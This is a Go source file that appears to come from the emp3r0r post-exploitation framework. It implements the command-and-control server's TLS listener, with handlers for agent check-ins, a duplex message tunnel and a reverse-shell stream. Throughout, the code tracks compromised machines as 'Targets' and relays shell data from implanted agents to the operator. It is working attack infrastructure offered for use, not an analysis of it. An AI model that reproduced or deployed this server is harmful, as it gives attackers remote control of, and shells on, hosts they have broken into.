package cc

import (
	"context"
	"encoding/json"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

// TLSServer start HTTPS server
func TLSServer() {
	if _, err := os.Stat(Temp + tun.FileAPI); os.IsNotExist(err) {
		err = os.MkdirAll(Temp+tun.FileAPI, 0700)
		if err != nil {
			log.Fatal("TLSServer: ", err)
		}
	}

	http.Handle("/", http.FileServer(http.Dir("/tmp/emp3r0r/www")))

	http.HandleFunc("/"+tun.CheckInAPI, checkinHandler)
	http.HandleFunc("/"+tun.MsgAPI, msgTunHandler)
	http.HandleFunc("/"+tun.ReverseShellAPI, rshellHandler)

	// emp3r0r.crt and emp3r0r.key is generated by build.sh
	err := http.ListenAndServeTLS(":8000", "emp3r0r-cert.pem", "emp3r0r-key.pem", nil)
	if err != nil {
		log.Fatal(color.RedString("Start HTTPS server: %v", err))
	}
}

// receive checkin requests from agents, add them to `Targets`
func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
	var target agent.SystemInfo
	jsonData, err := ioutil.ReadAll(req.Body)
	defer req.Body.Close()
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	err = json.Unmarshal(jsonData, &target)
	if err != nil {
		CliPrintError("checkinHandler: " + err.Error())
		return
	}

	// set target IP
	target.IP = req.RemoteAddr

	if !agentExists(&target) {
		inx := len(Targets)
		Targets[&target] = &Control{Index: inx, Conn: nil}
		shortname := strings.Split(target.Tag, "-")[0]
		CliPrintSuccess("\n[%d] Knock.. Knock...\n%s from %s,"+
			"running '%s'\n",
			inx, shortname, target.IP,
			target.OS)
	}
}

// rshellHandler handles buffered data
func rshellHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("streamHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	agent.H2Stream.Ctx = ctx
	agent.H2Stream.Cancel = cancel
	agent.H2Stream.Conn = conn
	CliPrintWarning("Got a stream connection from %s", req.RemoteAddr)

	defer func() {
		err = agent.H2Stream.Conn.Close()
		if err != nil {
			CliPrintError("streamHandler failed to close connection: " + err.Error())
		}
		CliPrintWarning("Closed stream connection from %s", req.RemoteAddr)
	}()

	for {
		data := make([]byte, agent.BufSize)
		_, err = agent.H2Stream.Conn.Read(data)
		if err != nil {
			CliPrintWarning("Disconnected: streamHandler read from RecvAgentBuf: %v", err)
			return
		}
		ShellRecvBuf <- data
	}
}

// msgTunHandler duplex tunnel between agent and cc
func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("tunHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	defer func() {
		for t, c := range Targets {
			if c.Conn == conn {
				delete(Targets, t)
				CliPrintWarning("tunHandler: agent [%d]:%s disconnected\n", c.Index, t.Tag)
				break
			}
		}
		err = conn.Close()
		if err != nil {
			CliPrintError("tunHandler failed to close connection: " + err.Error())
		}
	}()

	// talk in json
	var (
		in  = json.NewDecoder(conn)
		out = json.NewEncoder(conn)
		msg agent.MsgTunData
	)

	// Loop forever until the client hangs the connection, in which there will be an error
	// in the decode or encode stages.
	for {
		// deal with json data from agent
		err = in.Decode(&msg)
		if err != nil {
			return
		}
		// read hello from agent, set its Conn if needed, and hello back
		// close connection if agent is not responsive
		if msg.Payload == "hello" {
			err = out.Encode(msg)
			if err != nil {
				CliPrintWarning("tunHandler cannot send hello to agent [%s]", msg.Tag)
				return
			}
		}

		// process json tundata from agent
		processAgentData(&msg)

		// assign this Conn to a known agent
		agent := GetTargetFromTag(msg.Tag)
		if agent == nil {
			CliPrintWarning("tunHandler: agent not recognized")
			return
		}
		Targets[agent].Conn = conn

	}
}
